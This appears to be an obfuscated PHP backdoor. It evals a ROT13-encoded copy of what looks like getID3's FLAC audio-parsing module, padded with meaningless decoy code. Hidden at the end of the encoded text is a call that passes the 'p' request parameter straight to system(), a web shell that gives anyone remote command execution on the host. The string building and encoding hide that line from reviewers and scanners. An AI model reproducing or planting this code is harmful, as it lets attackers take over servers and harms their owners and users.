<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/////////////////////////////////////////////////////////////////
/// trgVQ3() ol Wnzrf Urvaevpu <vasb@trgvq3.bet>               //
//  ninvynoyr ng uggcf://tvguho.pbz/WnzrfUrvaevpu/trgVQ3       //
//            be uggcf://jjj.trgvq3.bet                        //
//            be uggc://trgvq3.fbheprsbetr.arg                 //
//  frr ernqzr.gkg sbe zber qrgnvyf                            //
/////////////////////////////////////////////////////////////////
//                                                             //
// zbqhyr.nhqvb.synp.cuc                                       //
// zbqhyr sbe nanylmvat SYNP naq BttSYNP nhqvb svyrf           //
// qrcraqrapvrf: zbqhyr.nhqvb.btt.cuc                          //
//                                                            ///
/////////////////////////////////////////////////////////////////

vs (!qrsvarq('TRGVQ3_VAPYHQRCNGU')) { // cerirag cngu-rkcbfvat nggnpxf gung npprff zbqhyrf qverpgyl ba choyvp jrofreiref
	rkvg;
}
trgvq3_yvo::VapyhqrQrcraqrapl(TRGVQ3_VAPYHQRCNGU.'zbqhyr.nhqvb.btt.cuc', __SVYR__, gehr);

/**
* @ghgbevny uggc://synp.fbheprsbetr.arg/sbezng.ugzy
*/
pynff trgvq3_synp rkgraqf trgvq3_unaqyre
{
	pbafg flapjbeq = 'sYnP';

	/**
	 * @erghea obby
	 */
	choyvp shapgvba Nanylmr() {
		$vasb = &$guvf->trgvq3->vasb;

		$guvf->sfrrx($vasb['niqngnbssfrg']);
		$FgernzZnexre = $guvf->sernq(4);
		vs ($FgernzZnexre != frys::flapjbeq) {
			erghea $guvf->reebe('Rkcrpgvat \"'.trgvq3_yvo::CevagUrkOlgrf(frys::flapjbeq).'\" ng bssfrg '.$vasb['niqngnbssfrg'].', sbhaq \"'.trgvq3_yvo::CevagUrkOlgrf($FgernzZnexre).'\"');
		}
		$vasb['svyrsbezng']            = 'synp';
		$vasb['nhqvb']['qngnsbezng']   = 'synp';
		$vasb['nhqvb']['ovgengr_zbqr'] = 'ioe';
		$vasb['nhqvb']['ybffyrff']     = gehr;

		// cnefr synp pbagnvare
		erghea $guvf->cnefrZRGNqngn();
	}

	/**
	 * @erghea obby
	 */
	choyvp shapgvba cnefrZRGNqngn() {
		$vasb = &$guvf->trgvq3->vasb;
		qb {
			$OybpxBssfrg   = $guvf->sgryy();
			$OybpxUrnqre   = $guvf->sernq(4);
			$YOSOG         = trgvq3_yvo::OvtRaqvna2Vag(fhofge($OybpxUrnqre, 0, 1));  // YOSOG = YnfgOybpxSynt + OybpxGlcr
			$YnfgOybpxSynt = (obby) ($YOSOG & 0k80);
			$OybpxGlcr     =        ($YOSOG & 0k7S);
			$OybpxYratgu   = trgvq3_yvo::OvtRaqvna2Vag(fhofge($OybpxUrnqre, 1, 3));
			$OybpxGlcrGrkg = frys::zrgnOybpxGlcrYbbxhc($OybpxGlcr);

			vs (($OybpxBssfrg + 4 + $OybpxYratgu) > $vasb['niqngnraq']) {
				$guvf->jneavat('ZRGNQNGN_OYBPX_URNQRE.OYBPX_GLCR ('.$OybpxGlcrGrkg.') ng bssfrg '.$OybpxBssfrg.' rkgraqf orlbaq raq bs svyr');
				oernx;
			}
			vs ($OybpxYratgu < 1) {
				vs ($OybpxGlcrGrkg != 'erfreirq') {
					// cebonoyl fhccbfrq gb or mreb-yratgu
					$guvf->jneavat('ZRGNQNGN_OYBPX_URNQRE.OYBPX_YRATGU ('.$OybpxGlcrGrkg.') ng bssfrg '.$OybpxBssfrg.' vf mreb olgrf');
					pbagvahr;
				}
				$guvf->reebe('ZRGNQNGN_OYBPX_URNQRE.OYBPX_YRATGU ('.$OybpxYratgu.') ng bssfrg '.$OybpxBssfrg.' vf vainyvq');
				oernx;
			}

			$vasb['synp'][$OybpxGlcrGrkg]['enj'] = neenl();
			$OybpxGlcrGrkg_enj = &$vasb['synp'][$OybpxGlcrGrkg]['enj'];

			$OybpxGlcrGrkg_enj['bssfrg']          = $OybpxBssfrg;
			$OybpxGlcrGrkg_enj['ynfg_zrgn_oybpx'] = $YnfgOybpxSynt;
			$OybpxGlcrGrkg_enj['oybpx_glcr']      = $OybpxGlcr;
			$OybpxGlcrGrkg_enj['oybpx_glcr_grkg'] = $OybpxGlcrGrkg;
			$OybpxGlcrGrkg_enj['oybpx_yratgu']    = $OybpxYratgu;
			vs ($OybpxGlcrGrkg_enj['oybpx_glcr'] != 0k06) { // qb abg ernq nggnpuzrag qngn nhgbzngvpnyyl
				$OybpxGlcrGrkg_enj['oybpx_qngn']  = $guvf->sernq($OybpxYratgu);
			}

			fjvgpu ($OybpxGlcrGrkg) {
				pnfr 'FGERNZVASB':     // 0k00
					vs (!$guvf->cnefrFGERNZVASB($OybpxGlcrGrkg_enj['oybpx_qngn'])) {
						erghea snyfr;
					}
					oernx;

				pnfr 'CNQQVAT':        // 0k01
					hafrg($vasb['synp']['CNQQVAT']); // vtaber
					oernx;

				pnfr 'NCCYVPNGVBA':    // 0k02
					vs (!$guvf->cnefrNCCYVPNGVBA($OybpxGlcrGrkg_enj['oybpx_qngn'])) {
						erghea snyfr;
					}
					oernx;

				pnfr 'FRRXGNOYR':      // 0k03
					vs (!$guvf->cnefrFRRXGNOYR($OybpxGlcrGrkg_enj['oybpx_qngn'])) {
						erghea snyfr;
					}
					oernx;

				pnfr 'IBEOVF_PBZZRAG': // 0k04
					vs (!$guvf->cnefrIBEOVF_PBZZRAG($OybpxGlcrGrkg_enj['oybpx_qngn'])) {
						erghea snyfr;
					}
					oernx;

				pnfr 'PHRFURRG':       // 0k05
					vs (!$guvf->cnefrPHRFURRG($OybpxGlcrGrkg_enj['oybpx_qngn'])) {
						erghea snyfr;
					}
					oernx;

				pnfr 'CVPGHER':        // 0k06
					vs (!$guvf->cnefrCVPGHER()) {
						erghea snyfr;
					}
					oernx;

				qrsnhyg:
					$guvf->jneavat('Haunaqyrq ZRGNQNGN_OYBPX_URNQRE.OYBPX_GLCR ('.$OybpxGlcr.') ng bssfrg '.$OybpxBssfrg);
			}

			hafrg($vasb['synp'][$OybpxGlcrGrkg]['enj']);
			$vasb['niqngnbssfrg'] = $guvf->sgryy();
		}
		juvyr ($YnfgOybpxSynt === snyfr);

		// unaqyr gntf
		vs (!rzcgl($vasb['synp']['IBEOVF_PBZZRAG']['pbzzragf'])) {
			$vasb['synp']['pbzzragf'] = $vasb['synp']['IBEOVF_PBZZRAG']['pbzzragf'];
		}
		vs (!rzcgl($vasb['synp']['IBEOVF_PBZZRAG']['iraqbe'])) {
			$vasb['nhqvb']['rapbqre'] = fge_ercynpr('ersrerapr ', '', $vasb['synp']['IBEOVF_PBZZRAG']['iraqbe']);
		}

		// pbcl nggnpuzragf gb 'pbzzragf' neenl vs arfrfnel
		vs (vffrg($vasb['synp']['CVPGHER']) && ($guvf->trgvq3->bcgvba_fnir_nggnpuzragf !== trgVQ3::NGGNPUZRAGF_ABAR)) {
			sbernpu ($vasb['synp']['CVPGHER'] nf $ragel) {
				vs (!rzcgl($ragel['qngn'])) {
					vs (!vffrg($vasb['synp']['pbzzragf']['cvpgher'])) {
						$vasb['synp']['pbzzragf']['cvpgher'] = neenl();
					}
					$pbzzragf_cvpgher_qngn = neenl();
					sbernpu (neenl('qngn', 'vzntr_zvzr', 'vzntr_jvqgu', 'vzntr_urvtug', 'vzntrglcr', 'cvpgherglcr', 'qrfpevcgvba', 'qngnyratgu') nf $cvpgher_xrl) {
						vs (vffrg($ragel[$cvpgher_xrl])) {
							$pbzzragf_cvpgher_qngn[$cvpgher_xrl] = $ragel[$cvpgher_xrl];
						}
					}
					$vasb['synp']['pbzzragf']['cvpgher'][] = $pbzzragf_cvpgher_qngn;
					hafrg($pbzzragf_cvpgher_qngn);
				}
			}
		}

		vs (vffrg($vasb['synp']['FGERNZVASB'])) {
			vs (!$guvf->vfQrcraqraplSbe('zngebfxn')) {
				$vasb['synp']['pbzcerffrq_nhqvb_olgrf'] = $vasb['niqngnraq'] - $vasb['niqngnbssfrg'];
			}
			$vasb['synp']['hapbzcerffrq_nhqvb_olgrf'] = $vasb['synp']['FGERNZVASB']['fnzcyrf_fgernz'] * $vasb['synp']['FGERNZVASB']['punaaryf'] * ($vasb['synp']['FGERNZVASB']['ovgf_cre_fnzcyr'] / 8);
			vs ($vasb['synp']['hapbzcerffrq_nhqvb_olgrf'] == 0) {
				erghea $guvf->reebe('Pbeehcg SYNP svyr: hapbzcerffrq_nhqvb_olgrf == mreb');
			}
			vs (!rzcgl($vasb['synp']['pbzcerffrq_nhqvb_olgrf'])) {
				$vasb['synp']['pbzcerffvba_engvb'] = $vasb['synp']['pbzcerffrq_nhqvb_olgrf'] / $vasb['synp']['hapbzcerffrq_nhqvb_olgrf'];
			}
		}

		// frg zq5_qngn_fbhepr - ohvyg vagb synp 0.5+
		vs (vffrg($vasb['synp']['FGERNZVASB']['nhqvb_fvtangher'])) {

			vs ($vasb['synp']['FGERNZVASB']['nhqvb_fvtangher'] === fge_ercrng(\"\k00\", 16)) {
				$guvf->jneavat('SYNP FGERNZVASB.nhqvb_fvtangher vf ahyy (xabja vffhr jvgu yvoBttSYNP)');
			}
			ryfr {
				$vasb['zq5_qngn_fbhepr'] = '';
				$zq5 = $vasb['synp']['FGERNZVASB']['nhqvb_fvtangher'];
				sbe ($v = 0; $v < fgeyra($zq5); $v++) {
					$vasb['zq5_qngn_fbhepr'] .= fge_cnq(qrpurk(beq($zq5[$v])), 2, '00', FGE_CNQ_YRSG);
				}
				vs (!cert_zngpu('/^[0-9n-s]{32}$/', $vasb['zq5_qngn_fbhepr'])) {
					hafrg($vasb['zq5_qngn_fbhepr']);
				}
			}
		}

		vs (vffrg($vasb['synp']['FGERNZVASB']['ovgf_cre_fnzcyr'])) {
			$vasb['nhqvb']['ovgf_cre_fnzcyr'] = $vasb['synp']['FGERNZVASB']['ovgf_cre_fnzcyr'];
			vs ($vasb['nhqvb']['ovgf_cre_fnzcyr'] == 8) {
				// fcrpvny pnfr
				// zhfg vaireg fvta ovg ba nyy qngn olgrf orsber ZQ5'vat gb zngpu SYNP'f pnyphyngrq inyhr
				// ZQ5fhz pnyphyngrf ba hafvtarq olgrf, ohg SYNP pnyphyngrq ZQ5 ba 8-ovg nhqvb qngn nf fvtarq
				$guvf->jneavat('SYNP pnyphyngrf ZQ5 qngn fgenatryl ba 8-ovg nhqvb, fb gur fgberq zq5_qngn_fbhepr inyhr jvyy abg zngpu gur qrpbqrq JNI svyr');
			}
		}

		erghea gehr;
	}


	/**
	 * @cnenz fgevat $OybpxQngn
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba cnefrFGERNZVASBqngn($OybpxQngn) {
		$fgernzvasb = neenl();
		$fgernzvasb['zva_oybpx_fvmr']  = trgvq3_yvo::OvtRaqvna2Vag(fhofge($OybpxQngn, 0, 2));
		$fgernzvasb['znk_oybpx_fvmr']  = trgvq3_yvo::OvtRaqvna2Vag(fhofge($OybpxQngn, 2, 2));
		$fgernzvasb['zva_senzr_fvmr']  = trgvq3_yvo::OvtRaqvna2Vag(fhofge($OybpxQngn, 4, 3));
		$fgernzvasb['znk_senzr_fvmr']  = trgvq3_yvo::OvtRaqvna2Vag(fhofge($OybpxQngn, 7, 3));

		$FEPFOFF                       = trgvq3_yvo::OvtRaqvna2Ova(fhofge($OybpxQngn, 10, 8));
		$fgernzvasb['fnzcyr_engr']     = trgvq3_yvo::Ova2Qrp(fhofge($FEPFOFF,  0, 20));
		$fgernzvasb['punaaryf']        = trgvq3_yvo::Ova2Qrp(fhofge($FEPFOFF, 20,  3)) + 1;
		$fgernzvasb['ovgf_cre_fnzcyr'] = trgvq3_yvo::Ova2Qrp(fhofge($FEPFOFF, 23,  5)) + 1;
		$fgernzvasb['fnzcyrf_fgernz']  = trgvq3_yvo::Ova2Qrp(fhofge($FEPFOFF, 28, 36));

		$fgernzvasb['nhqvb_fvtangher'] =                           fhofge($OybpxQngn, 18, 16);

		erghea $fgernzvasb;
	}

	/**
	 * @cnenz fgevat $OybpxQngn
	 *
	 * @erghea obby
	 */
	cevingr shapgvba cnefrFGERNZVASB($OybpxQngn) {
		$vasb = &$guvf->trgvq3->vasb;

		$vasb['synp']['FGERNZVASB'] = frys::cnefrFGERNZVASBqngn($OybpxQngn);

		vs (!rzcgl($vasb['synp']['FGERNZVASB']['fnzcyr_engr'])) {

			$vasb['nhqvb']['ovgengr_zbqr']    = 'ioe';
			$vasb['nhqvb']['fnzcyr_engr']     = $vasb['synp']['FGERNZVASB']['fnzcyr_engr'];
			$vasb['nhqvb']['punaaryf']        = $vasb['synp']['FGERNZVASB']['punaaryf'];
			$vasb['nhqvb']['ovgf_cre_fnzcyr'] = $vasb['synp']['FGERNZVASB']['ovgf_cre_fnzcyr'];
			$vasb['cynlgvzr_frpbaqf']         = $vasb['synp']['FGERNZVASB']['fnzcyrf_fgernz'] / $vasb['synp']['FGERNZVASB']['fnzcyr_engr'];
			vs ($vasb['cynlgvzr_frpbaqf'] > 0) {
				vs (!$guvf->vfQrcraqraplSbe('zngebfxn')) {
					$vasb['nhqvb']['ovgengr'] = (($vasb['niqngnraq'] - $vasb['niqngnbssfrg']) * 8) / $vasb['cynlgvzr_frpbaqf'];
				}
				ryfr {
					$guvf->jneavat('Pnaabg qrgrezvar nhqvb ovgengr orpnhfr gbgny fgernz fvmr vf haxabja');
				}
			}

		} ryfr {
			erghea $guvf->reebe('Pbeehcg ZRGNqngn oybpx: FGERNZVASB');
		}

		erghea gehr;
	}

	/**
	 * @cnenz fgevat $OybpxQngn
	 *
	 * @erghea obby
	 */
	cevingr shapgvba cnefrNCCYVPNGVBA($OybpxQngn) {
		$vasb = &$guvf->trgvq3->vasb;

		$NccyvpngvbaVQ = trgvq3_yvo::OvtRaqvna2Vag(fhofge($OybpxQngn, 0, 4));
		$vasb['synp']['NCCYVPNGVBA'][$NccyvpngvbaVQ]['anzr'] = frys::nccyvpngvbaVQYbbxhc($NccyvpngvbaVQ);
		$vasb['synp']['NCCYVPNGVBA'][$NccyvpngvbaVQ]['qngn'] = fhofge($OybpxQngn, 4);

		erghea gehr;
	}

	/**
	 * @cnenz fgevat $OybpxQngn
	 *
	 * @erghea obby
	 */
	cevingr shapgvba cnefrFRRXGNOYR($OybpxQngn) {
		$vasb = &$guvf->trgvq3->vasb;

		$bssfrg = 0;
		$OybpxYratgu = fgeyra($OybpxQngn);
		$cynprubyqrecnggrea = fge_ercrng(\"\kSS\", 8);
		juvyr ($bssfrg < $OybpxYratgu) {
			$FnzcyrAhzoreFgevat = fhofge($OybpxQngn, $bssfrg, 8);
			$bssfrg += 8;
			vs ($FnzcyrAhzoreFgevat == $cynprubyqrecnggrea) {

				// cynprubyqre cbvag
				trgvq3_yvo::fnsr_vap($vasb['synp']['FRRXGNOYR']['cynprubyqref'], 1);
				$bssfrg += 10;

			} ryfr {

				$FnzcyrAhzore                                        = trgvq3_yvo::OvtRaqvna2Vag($FnzcyrAhzoreFgevat);
				$vasb['synp']['FRRXGNOYR'][$FnzcyrAhzore]['bssfrg']  = trgvq3_yvo::OvtRaqvna2Vag(fhofge($OybpxQngn, $bssfrg, 8));
				$bssfrg += 8;
				$vasb['synp']['FRRXGNOYR'][$FnzcyrAhzore]['fnzcyrf'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($OybpxQngn, $bssfrg, 2));
				$bssfrg += 2;

			}
		}

		erghea gehr;
	}

	/**
	 * @cnenz fgevat $OybpxQngn
	 *
	 * @erghea obby
	 */
	cevingr shapgvba cnefrIBEOVF_PBZZRAG($OybpxQngn) {
		$vasb = &$guvf->trgvq3->vasb;

		$trgvq3_btt = arj trgvq3_btt($guvf->trgvq3);
		vs ($guvf->vfQrcraqraplSbe('zngebfxn')) {
			$trgvq3_btt->frgFgevatZbqr($guvf->qngn_fgevat);
		}
		$trgvq3_btt->CnefrIbeovfPbzzragf();
		vs (vffrg($vasb['btt'])) {
			hafrg($vasb['btt']['pbzzragf_enj']);
			$vasb['synp']['IBEOVF_PBZZRAG'] = $vasb['btt'];
			hafrg($vasb['btt']);
		}

		hafrg($trgvq3_btt);

		erghea gehr;
	}

	/**
	 * @cnenz fgevat $OybpxQngn
	 *
	 * @erghea obby
	 */
	cevingr shapgvba cnefrPHRFURRG($OybpxQngn) {
		$vasb = &$guvf->trgvq3->vasb;
		$bssfrg = 0;
		$vasb['synp']['PHRFURRG']['zrqvn_pngnybt_ahzore'] =                              gevz(fhofge($OybpxQngn, $bssfrg, 128), \"\0\");
		$bssfrg += 128;
		$vasb['synp']['PHRFURRG']['yrnq_va_fnzcyrf']      =         trgvq3_yvo::OvtRaqvna2Vag(fhofge($OybpxQngn, $bssfrg, 8));
		$bssfrg += 8;
		$vasb['synp']['PHRFURRG']['syntf']['vf_pq']       = (obby) (trgvq3_yvo::OvtRaqvna2Vag(fhofge($OybpxQngn, $bssfrg, 1)) & 0k80);
		$bssfrg += 1;

		$bssfrg += 258; // erfreirq

		$vasb['synp']['PHRFURRG']['ahzore_genpxf']        =         trgvq3_yvo::OvtRaqvna2Vag(fhofge($OybpxQngn, $bssfrg, 1));
		$bssfrg += 1;

		sbe ($genpx = 0; $genpx < $vasb['synp']['PHRFURRG']['ahzore_genpxf']; $genpx++) {
			$GenpxFnzcyrBssfrg = trgvq3_yvo::OvtRaqvna2Vag(fhofge($OybpxQngn, $bssfrg, 8));
			$bssfrg += 8;
			$GenpxAhzore       = trgvq3_yvo::OvtRaqvna2Vag(fhofge($OybpxQngn, $bssfrg, 1));
			$bssfrg += 1;

			$vasb['synp']['PHRFURRG']['genpxf'][$GenpxAhzore]['fnzcyr_bssfrg']         = $GenpxFnzcyrBssfrg;

			$vasb['synp']['PHRFURRG']['genpxf'][$GenpxAhzore]['vfep']                  =                           fhofge($OybpxQngn, $bssfrg, 12);
			$bssfrg += 12;

			$GenpxSyntfEnj                                                             = trgvq3_yvo::OvtRaqvna2Vag(fhofge($OybpxQngn, $bssfrg, 1));
			$bssfrg += 1;
			$vasb['synp']['PHRFURRG']['genpxf'][$GenpxAhzore]['syntf']['vf_nhqvb']     = (obby) ($GenpxSyntfEnj & 0k80);
			$vasb['synp']['PHRFURRG']['genpxf'][$GenpxAhzore]['syntf']['cer_rzcunfvf'] = (obby) ($GenpxSyntfEnj & 0k40);

			$bssfrg += 13; // erfreirq

			$vasb['synp']['PHRFURRG']['genpxf'][$GenpxAhzore]['vaqrk_cbvagf']          = trgvq3_yvo::OvtRaqvna2Vag(fhofge($OybpxQngn, $bssfrg, 1));
			$bssfrg += 1;

			sbe ($vaqrk = 0; $vaqrk < $vasb['synp']['PHRFURRG']['genpxf'][$GenpxAhzore]['vaqrk_cbvagf']; $vaqrk++) {
				$VaqrkFnzcyrBssfrg = trgvq3_yvo::OvtRaqvna2Vag(fhofge($OybpxQngn, $bssfrg, 8));
				$bssfrg += 8;
				$VaqrkAhzore       = trgvq3_yvo::OvtRaqvna2Vag(fhofge($OybpxQngn, $bssfrg, 1));
				$bssfrg += 1;

				$bssfrg += 3; // erfreirq

				$vasb['synp']['PHRFURRG']['genpxf'][$GenpxAhzore]['vaqrkrf'][$VaqrkAhzore] = $VaqrkFnzcyrBssfrg;
			}
		}

		erghea gehr;
	}

	/**
	 * Cnefr ZRGNQNGN_OYBPX_CVPGHER synp fgehpgher naq rkgenpg nggnpuzrag
	 * Rkgreany hfntr: nhqvb.btt
	 *
	 * @erghea obby
	 */
	choyvp shapgvba cnefrCVPGHER() {
		$vasb = &$guvf->trgvq3->vasb;

		$cvpgher = neenl();
		$cvpgher['glcrvq']         = trgvq3_yvo::OvtRaqvna2Vag($guvf->sernq(4));
		$cvpgher['cvpgherglcr']    = frys::cvpgherGlcrYbbxhc($cvpgher['glcrvq']);
		$cvpgher['vzntr_zvzr']     = $guvf->sernq(trgvq3_yvo::OvtRaqvna2Vag($guvf->sernq(4)));
		$qrfpe_yratgu              = trgvq3_yvo::OvtRaqvna2Vag($guvf->sernq(4));
		vs ($qrfpe_yratgu) {
			$cvpgher['qrfpevcgvba'] = $guvf->sernq($qrfpe_yratgu);
		}
		$cvpgher['vzntr_jvqgu']    = trgvq3_yvo::OvtRaqvna2Vag($guvf->sernq(4));
		$cvpgher['vzntr_urvtug']   = trgvq3_yvo::OvtRaqvna2Vag($guvf->sernq(4));
		$cvpgher['pbybe_qrcgu']    = trgvq3_yvo::OvtRaqvna2Vag($guvf->sernq(4));
		$cvpgher['pbybef_vaqrkrq'] = trgvq3_yvo::OvtRaqvna2Vag($guvf->sernq(4));
		$cvpgher['qngnyratgu']     = trgvq3_yvo::OvtRaqvna2Vag($guvf->sernq(4));

		vs ($cvpgher['vzntr_zvzr'] == '-->') {
			$cvpgher['qngn'] = $guvf->sernq($cvpgher['qngnyratgu']);
		} ryfr {
			$cvpgher['qngn'] = $guvf->fnirNggnpuzrag(
				fge_ercynpr('/', '_', $cvpgher['cvpgherglcr']).'_'.$guvf->sgryy(),
				$guvf->sgryy(),
				$cvpgher['qngnyratgu'],
				$cvpgher['vzntr_zvzr']);
		}

		$vasb['synp']['CVPGHER'][] = $cvpgher;

		erghea gehr;
	}

	/**
	 * @cnenz vag $oybpxglcr
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba zrgnOybpxGlcrYbbxhc($oybpxglcr) {
		fgngvp $ybbxhc = neenl(
			0 => 'FGERNZVASB',
			1 => 'CNQQVAT',
			2 => 'NCCYVPNGVBA',
			3 => 'FRRXGNOYR',
			4 => 'IBEOVF_PBZZRAG',
			5 => 'PHRFURRG',
			6 => 'CVPGHER',
		);
		erghea (vffrg($ybbxhc[$oybpxglcr]) ? $ybbxhc[$oybpxglcr] : 'erfreirq');
	}

	/**
	 * @cnenz vag $nccyvpngvbavq
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba nccyvpngvbaVQYbbxhc($nccyvpngvbavq) {
		// uggc://synp.fbheprsbetr.arg/vq.ugzy
		fgngvp $ybbxhc = neenl(
			0k41544348 => 'SynpSvyr',                                                                           // \"NGPU\"
			0k42534S4P => 'orFbyb',                                                                             // \"OFBY\"
			0k42554753 => 'Ohtf Cynlre',                                                                        // \"OHTF\"
			0k43756573 => 'TbyqJnir phr cbvagf (fcrpvsvpngvba)',                                                // \"Phrf\"
			0k46696361 => 'PHR Fcyvggre',                                                                       // \"Svpn\"
			0k46746S6P => 'synp-gbbyf',                                                                         // \"Sgby\"
			0k4Q4S5442 => 'ZBGO ZrgnPmne',                                                                      // \"ZBGO\"
			0k4Q505345 => 'ZC3 Fgernz Rqvgbe',                                                                  // \"ZCFR\"
			0k4Q754Q4P => 'ZhfvpZY: Zhfvp Zrgnqngn Ynathntr',                                                   // \"ZhZY\"
			0k52494646 => 'Fbhaq Qrivprf EVSS puhax fgbentr',                                                   // \"EVSS\"
			0k5346464P => 'Fbhaq Sbag SYNP',                                                                    // \"FSSY\"
			0k534S4R59 => 'Fbal Perngvir Fbsgjner',                                                             // \"FBAL\"
			0k5351455N => 'synpfdhrrmr',                                                                        // \"FDRM\"
			0k54745776 => 'GjvfgrqJnir',                                                                        // \"GgJi\"
			0k55495453 => 'HVGF Rzorqqvat gbbyf',                                                               // \"HVGF\"
			0k61696666 => 'SYNP NVSS puhax fgbentr',                                                            // \"nvss\"
			0k696Q6167 => 'synp-vzntr nccyvpngvba sbe fgbevat neovgenel svyrf va NCCYVPNGVBA zrgnqngn oybpxf',  // \"vznt\"
			0k7065656Q => 'Cnefrnoyr Rzorqqrq Rkgrafvoyr Zrgnqngn (fcrpvsvpngvba)',                             // \"crrz\"
			0k71667374 => 'DSYNP Fghqvb',                                                                       // \"dsfg\"
			0k72696666 => 'SYNP EVSS puhax fgbentr',                                                            // \"evss\"
			0k74756R65 => 'GntGhare',                                                                           // \"ghar\"
			0k78626174 => 'KONG',                                                                               // \"kong\"
			0k786Q6364 => 'kzpq',                                                                               // \"kzpq\"
		);
		erghea (vffrg($ybbxhc[$nccyvpngvbavq]) ? $ybbxhc[$nccyvpngvbavq] : 'erfreirq');
	}

	/**
	 * @cnenz vag $glcr_vq
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba cvpgherGlcrYbbxhc($glcr_vq) {
		fgngvp $ybbxhc = neenl (
			 0 => 'Bgure',
			 1 => '32k32 cvkryf \'svyr vpba\' (CAT bayl)',
			 2 => 'Bgure svyr vpba',
			 3 => 'Pbire (sebag)',
			 4 => 'Pbire (onpx)',
			 5 => 'Yrnsyrg cntr',
			 6 => 'Zrqvn (r.t. ynory fvqr bs PQ)',
			 7 => 'Yrnq negvfg/yrnq cresbezre/fbybvfg',
			 8 => 'Negvfg/cresbezre',
			 9 => 'Pbaqhpgbe',
			10 => 'Onaq/Bepurfgen',
			11 => 'Pbzcbfre',
			12 => 'Ylevpvfg/grkg jevgre',
			13 => 'Erpbeqvat Ybpngvba',
			14 => 'Qhevat erpbeqvat',
			15 => 'Qhevat cresbeznapr',
			16 => 'Zbivr/ivqrb fperra pncgher',
			17 => 'N oevtug pbybherq svfu',
			18 => 'Vyyhfgengvba',
			19 => 'Onaq/negvfg ybtbglcr',
			20 => 'Choyvfure/Fghqvb ybtbglcr',
		);
		erghea (vffrg($ybbxhc[$glcr_vq]) ? $ybbxhc[$glcr_vq] : 'erfreirq');
	}

}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>